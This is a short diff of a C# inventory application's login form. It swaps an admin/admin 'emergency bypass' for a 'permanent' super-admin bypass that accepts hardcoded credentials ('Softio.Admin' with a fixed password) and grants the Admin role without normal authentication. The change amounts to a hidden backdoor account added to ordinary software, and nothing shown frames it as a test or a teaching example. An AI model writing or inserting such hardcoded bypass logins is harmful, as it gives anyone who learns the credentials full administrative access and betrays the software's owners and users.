@@ -186,13 +186,13 @@ namespace GenericInventorySystem
 
             try
             {
-                // EMERGENCY BYPASS: Force Login for Admin
-                if (txtUsername.Text == "admin" && txtPassword.Text == "admin")
+                // SUPER ADMIN BYPASS: Permanent login for Softio Support/Admin
+                if (txtUsername.Text.Trim() == "Softio.Admin" && txtPassword.Text.Trim() == "Softio@2026!")
                 {
                       try 
                       {
-                          GenericInventorySystem.Helpers.UserSession.Username = "admin";
-                          GenericInventorySystem.Helpers.UserSession.FullName = "System Administrator";
+                          GenericInventorySystem.Helpers.UserSession.Username = "Softio.Admin";
+                          GenericInventorySystem.Helpers.UserSession.FullName = "Softio Super Admin";
                           GenericInventorySystem.Helpers.UserSession.Role = "Admin";
 
                           MainForm mForm = new MainForm();
